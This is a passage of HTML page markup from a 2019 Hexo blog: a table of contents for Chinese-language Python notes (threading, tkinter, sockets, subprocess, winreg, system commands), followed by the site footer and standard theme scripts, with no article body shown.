href="#shutil-copymode"><span class="nav-text">shutil.copymode()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#shutil-copystat-src-dst"><span class="nav-text">shutil.copystat(src,dst)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#shutil-copy"><span class="nav-text">shutil.copy()</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#threading模块"><span class="nav-text">threading模块</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#threading-Thread"><span class="nav-text">threading.Thread()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#threading-Thread-start"><span class="nav-text">threading.Thread.start()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#threading-Thread-join"><span class="nav-text">threading.Thread.join()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#threading-Lock"><span class="nav-text">threading.Lock()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#threading-Lock-acquire"><span class="nav-text">threading.Lock().acquire()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#threading-Lock-release"><span class="nav-text">threading.Lock().release()</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#tkinter模块"><span class="nav-text">tkinter模块</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#tkinter-Tk"><span class="nav-text">tkinter.Tk()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#tkinter-Tk-title"><span class="nav-text">tkinter.Tk().title()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#tkinter-Tk-geometry"><span class="nav-text">tkinter.Tk().geometry()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#tkinter-Tk-wm-attributes"><span class="nav-text">tkinter.Tk().wm_attributes()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#tkinter-Button"><span class="nav-text">tkinter.Button()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#tkinter-Button-config"><span class="nav-text">tkinter.Button().config()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#tkinter-Button-pack"><span class="nav-text">tkinter.Button().pack()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#tkiter-messagebox-showinfo"><span class="nav-text">tkiter.messagebox.showinfo()</span></a></li></ol></li></ol><li class="nav-item nav-level-1"><a class="nav-link" href="#异常处理"><span class="nav-text">异常处理</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Python标准异常"><span class="nav-text">Python标准异常</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#进程和线程"><span class="nav-text">进程和线程</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#进程"><span class="nav-text">进程</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#多进程实例"><span class="nav-text">多进程实例</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#线程"><span class="nav-text">线程</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#协程"><span class="nav-text">协程</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Python脚本"><span class="nav-text">Python脚本</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#结构"><span class="nav-text">结构</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#sys模块"><span class="nav-text">sys模块</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#socket模块"><span class="nav-text">socket模块</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#send"><span class="nav-text">send()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#sendall"><span class="nav-text">sendall()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#sendto"><span class="nav-text">sendto()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#connect"><span class="nav-text">connect()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#close"><span class="nav-text">close()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#bind"><span class="nav-text">bind()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#listen"><span class="nav-text">listen()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#recv"><span class="nav-text">recv()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#recvfrom"><span class="nav-text">recvfrom()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#SOCK-STREAM"><span class="nav-text">SOCK_STREAM</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#SOCK-DGRAM"><span class="nav-text">SOCK_DGRAM</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#AF-INET"><span class="nav-text">AF_INET</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#AF-INET6"><span class="nav-text">AF_INET6</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#AF-UNIX"><span class="nav-text">AF_UNIX</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#异常处理-1"><span class="nav-text">异常处理</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#错误"><span class="nav-text">错误</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#异常"><span class="nav-text">异常</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#语法"><span class="nav-text">语法</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#生成exe文件"><span class="nav-text">生成exe文件</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#subprocess模块"><span class="nav-text">subprocess模块</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#subprocess-Popen"><span class="nav-text">subprocess.Popen()</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#optparse模块"><span class="nav-text">optparse模块</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#optparse-OptionParser"><span class="nav-text">optparse.OptionParser()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#optparse-add-option"><span class="nav-text">optparse.add_option()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#optparse-parse-args"><span class="nav-text">optparse.parse_args()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#optparse-attributes"><span class="nav-text">optparse.attributes</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#option-action"><span class="nav-text">option.action</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#option-type"><span class="nav-text">option.type</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#option-dest"><span class="nav-text">option.dest</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#option-help"><span class="nav-text">option.help</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#cymruwhois模块"><span class="nav-text">cymruwhois模块</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Client"><span class="nav-text">Client()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Clien-lookupmany-dict"><span class="nav-text">Clien().lookupmany_dict()</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#执行系统命令"><span class="nav-text">执行系统命令</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#os-system-1"><span class="nav-text">os.system()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#subprocess-Popen-1"><span class="nav-text">subprocess.Popen()</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#winreg模块"><span class="nav-text">winreg模块</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#winreg-OpenKey"><span class="nav-text">winreg.OpenKey()</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#参考"><span class="nav-text">参考</span></a></li></div>
            

          </div>
        </div>
      <!--/noindex-->
      

      
        <div class="back-to-top">
          <i class="fa fa-arrow-up"></i>
          
            <span id="scrollpercent"><span>0</span>%</span>
          
        </div>
      

    </div>
  </aside>
  


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
  <span class="with-love" id="animate">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">chessur</span>

  

  
</div>


  <div class="powered-by">Powered by <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> v3.8.0</div>



  <span class="post-meta-divider">|</span>



  <div class="theme-info">Theme – <a href="https://theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> v7.1.1</div>




        








        
      </div>
    </footer>

    

    

    

    
  </div>

  

<script>
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>


























  
  <script src="/lib/jquery/index.js?v=2.1.3"></script>

  
  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>

  
  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>


  


  <script src="/js/utils.js?v=7.1.1"></script>

  <script src="/js/motion.js?v=7.1.1"></script>



  
  


  <script src="/js/affix.js?v=7.1.1"></script>

  <script src="/js/schemes/pisces.js?v=7.1.1"></script>




  
  <script src="/js/scrollspy.js?v=7.1.1"></script>
<script src="/js/post-details.js?v=7.1.1"></script>



  


  <script src="/js/next-boot.js?v=7.1.1"></script>


  

  

  

  


  


  




  

  

  

  

  

  

  

  

  

  

  

  
<script>
  $('.highlight').not('.gist .highlight').each(function(i, e) {
    var $wrap = $('<div>').addClass('highlight-wrap');
    $(e).after($wrap);
    $wrap.append($('<button>').addClass('copy-btn').append('Copy').on('click', function(e) {
      var code = $(this).parent().find('.code').find('.line').map(function(i, e) {
        return $(e).text();
      }).toArray().join('\n');
      var ta = document.createElement('textarea');
      var yPosition = window.pageYOffset || document.documentElement.scrollTop;
      ta.style.top = yPosition + 'px'; // Prevent page scroll
      ta.style.position = 'absolute';
      ta.style.opacity = '0';
      ta.readOnly = true;
      ta.value = code;
      document.body.appendChild(ta);
      ta.select();
      ta.setSelectionRange(0, code.length);
      ta.readOnly = false;
      var result = document.execCommand('copy');
      
        if (result) $(this).text('Copied');
        else $(this).text('Copy failed');
      
      ta.blur(); // For iOS
      $(this).blur();
    })).on('mouseleave', function(e) {
      var $b = $(this).find('.copy-btn');
      setTimeout(function() {
        $b.text('Copy');
      }, 300);
    }).append(e);
  })
</script>


  

  

</body>
</html>
